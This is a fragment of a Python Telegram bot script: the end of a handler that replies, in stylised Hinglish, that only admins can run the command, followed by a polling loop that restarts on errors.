        response = "𝗬𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘀𝗶𝗿𝗳 𝗮𝗱𝗺𝗶𝗻 𝗵𝗶 𝗰𝗵𝗮𝗹𝗮 𝘀𝗮𝗸𝘁𝗲 𝗵𝗮𝗶 😡."

    bot.reply_to(message, response)


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)